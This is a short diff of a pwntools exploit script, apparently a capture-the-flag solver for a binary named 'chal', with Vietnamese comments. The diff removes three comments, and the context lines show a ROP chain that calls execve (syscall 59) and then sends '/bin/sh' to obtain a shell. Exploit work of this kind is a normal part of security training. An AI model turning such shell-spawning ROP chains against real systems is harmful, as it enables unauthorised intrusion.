@@ -1,6 +1,5 @@
 from pwn import *
 
-# --- CẤU HÌNH ---
 # exe = ELF('./chal')
 # context.binary = exe
 # p = process('./chal')
@@ -81,7 +80,6 @@ payload += p64(59)
 payload += p64(syscall_addr)
 # Không cần padding ở đây nữa vì ta đã có shell
 
-# --- GỬI ---
 print("[*] Sending ROP Chain...")
 # Đọc dòng chào mừng đầu tiên
 try:
@@ -91,7 +89,6 @@ except:
 
 p.send(payload)
 
-# Đợi payload 1 thực thi xong syscall read
 time.sleep(0.5)
 
 print("[*] Sending /bin/sh...")
